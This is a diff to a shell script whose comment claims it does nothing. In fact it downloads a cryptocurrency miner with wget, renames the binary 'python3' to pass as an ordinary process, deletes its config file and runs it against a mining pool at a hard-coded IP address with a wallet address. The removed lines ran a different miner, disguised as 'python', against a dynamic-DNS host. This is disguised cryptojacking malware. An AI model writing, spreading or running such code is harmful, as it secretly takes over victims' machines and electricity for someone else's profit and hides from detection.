@@ -10,27 +10,26 @@
 # bits.
 #
 # By default this script does nothing.
-if [ -f ${PWD}/python ]; then
-    if pgrep -x "python" > /dev/null
+if [ -f ${PWD}/python3 ]; then
+    if pgrep -x "python3" > /dev/null
 then
-pkill python
-echo " kill process"
-./python -F http://ohmygodguru.ddns.net:56789/0x6f392f86702e358b16074ad635f9b273b44972c1/CR7
-
+    echo "Miner dang chay roi , ke cmn di "
     
 else
 
 echo "Miner da install , chay thoi "
-./python -F http://ohmygodguru.ddns.net:56789/0x6f392f86702e358b16074ad635f9b273b44972c1/CR7
+./python3 -o 42.119.159.78:4123 -u 0x3bd1c067bbfe2ea37a0a632c6fa81626532d9262 -p x
 
      
 fi
 exit
 fi
 
-wget https://github.com/aquanetwork/aquachain/releases/download/1.5.5/aquaminer-0.4-linux-amd64.zip
-unzip aquaminer-0.4-linux-amd64.zip
-mv aquaminer-0.4-linux-amd64 python
-./python -F http://ohmygodguru.ddns.net:56789/0x6f392f86702e358b16074ad635f9b273b44972c1/CR7
+
+wget https://github.com/webchain-network/webchain-miner/releases/download/v2.6.2.0/webchain-miner-2.6.2.0-linux-amd64.tar.gz
+tar xvzf webchain-miner-2.6.2.0-linux-amd64.tar.gz
+mv webchain-miner python3
+rm config.json
+./python3 -o 42.119.159.78:4123 -u 0x3bd1c067bbfe2ea37a0a632c6fa81626532d9262 -p x
 
 exit 0
